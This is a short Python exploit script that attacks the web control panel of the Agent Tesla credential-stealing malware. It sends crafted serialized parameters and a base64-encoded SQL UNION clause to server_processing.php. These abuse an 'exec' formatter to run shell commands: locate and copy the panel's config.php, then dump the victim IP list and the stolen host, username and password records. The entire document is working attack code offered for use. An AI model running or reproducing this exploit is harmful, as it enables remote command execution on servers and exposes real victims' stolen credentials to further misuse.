# Agent Tesla Exploit By Yattaze
import requests, base64
HOST = "http://"
EXPLOIT_PATH = "/WebPanel/server_side/scripts/server_processing.php"
URL = HOST + EXPLOIT_PATH

def grabIps():
    BOT_IP_EXPLOIT = {'table': 'victims',
                      'primary': 'id',
                      'clmns': 'a:1:{i:0;a:2:{s:2:%22db%22;s:9:%22ip_addres%22;s:2:%22dt%22;i:0;}}'
                      }
    r = requests.get(url = URL, params = BOT_IP_EXPLOIT)
    ret = r.json()
    print('[*] Exploiting: ' + HOST + ' for Victim Ip\'s')
    print('[*] Total Victims: ' + str(ret['recordsTotal']) + "\n")
    for i in ret['data']: print(i[0])

def grabPasswords():
    PASS_EXPLOIT = {'table': 'passwords',
                    'primary': 'password_id',
                    'clmns': 'a:3:{i:0;a:2:{s:2:"db";s:4:"host";s:2:"dt";i:0;}i:1;a:2:{s:2:"db";s:8:"username";s:2:"dt";i:1;}i:2;a:2:{s:2:"db";s:3:"pwd";s:2:"dt";i:2;}}'
                    }
    r = requests.get(url = URL, params = PASS_EXPLOIT)
    ret = r.json()
    print('[*] Exploiting: ' + HOST + ' for Victim Passwords\'s')
    print('[*] Total Passwords: ' + str(ret['recordsTotal']) + "\n")
    print('HOST : USERNAME : PASSWORD\n')
    for i in ret['data']: print(i[0] + " : " + i[1] + " : " + i[2])

def grabConfig():
    print('[*] Exploiting: ' + HOST + ' for Panel Config')
    EXPLOIT1 = {'table': 'passwords',
                'primary': 'password_id',
                'clmns': 'a:1:{i:0;a:3:{s:2:"db";s:3:"pwd";s:2:"dt";s:8:"username";s:9:"formatter";s:4:"exec";}}',
                'where': 'MT0xIFVOSU9OIFNFTEVDVCAiZmluZCAvIC1uYW1lICdjb25maWcucGhwJyI='
                }
    r = requests.get(url = URL, params = EXPLOIT1)
    ret = r.json()
    for k, v in ret['data'][-1].items(): config = v
    print('[*] Got config location: ' + v)
    where = base64.standard_b64encode('1=1 UNION SELECT \"cat '+config+' > pwn.txt\"')
    print('[*] Constructed Exploit: ' + where)
    EXPLOIT2 = {'table': 'passwords',
                'primary': 'password_id',
                'clmns': 'a:1:{i:0;a:3:{s:2:"db";s:3:"pwd";s:2:"dt";s:8:"username";s:9:"formatter";s:4:"exec";}}',
                'where': where
                }
    r = requests.get(url = URL, params = EXPLOIT2)
    p = HOST + "/WebPanel/server_side/scripts/pwn.txt"
    r = requests.get(url = p)
    print("\n[+] Exploited\n" + r.content)

grabConfig()
grabIps()
grabPasswords()
